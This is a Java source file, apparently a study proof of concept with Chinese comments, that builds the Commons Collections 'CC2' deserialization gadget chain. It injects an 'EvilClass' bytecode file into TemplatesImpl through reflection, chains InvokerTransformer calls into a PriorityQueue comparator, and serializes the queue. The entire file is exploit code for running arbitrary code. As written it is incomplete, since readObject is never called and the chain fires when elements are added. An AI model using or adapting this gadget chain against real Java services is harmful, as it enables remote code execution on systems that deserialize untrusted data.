import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CC2_TemplatesImpl {
    // 反射工具方法
    private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        // 创建 TemplatesImpl 实例
        TemplatesImpl templates = new TemplatesImpl();
        //读取 EvilClass.class 文件
        byte[] evilBytes = Files.readAllBytes(Paths.get( System.getProperty("user.dir")+"\\commons-collections\\CommonsCollections2/src/main/java/EvilClass.class"));

        // 反射设置字段
        setFieldValue(templates, "_name", "EvilClass");
        setFieldValue(templates, "_bytecodes", new byte[][] {evilBytes});
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        // 触发类加载与实例化
//        templates.newTransformer(); // 弹出计算器

        //构造执行链
        Transformer[] transformers = {
                new ConstantTransformer(templates),
                new InvokerTransformer("newTransformer", new Class[0], new Object[0])

        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        //设置比较器transformingComparator,比较对象时使用chainedTransformer进行转换
        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);


        // 创建 PriorityQueue 实例，并注入comparator为transformingComparator
        PriorityQueue priorityQueue = new PriorityQueue(2, transformingComparator);
        priorityQueue.add(1);
        priorityQueue.add(2);


        //进行序列化
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(priorityQueue);
        objectOutputStream.close();
        byteArrayOutputStream.close();

        //进行反序列化
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);

    }

    }
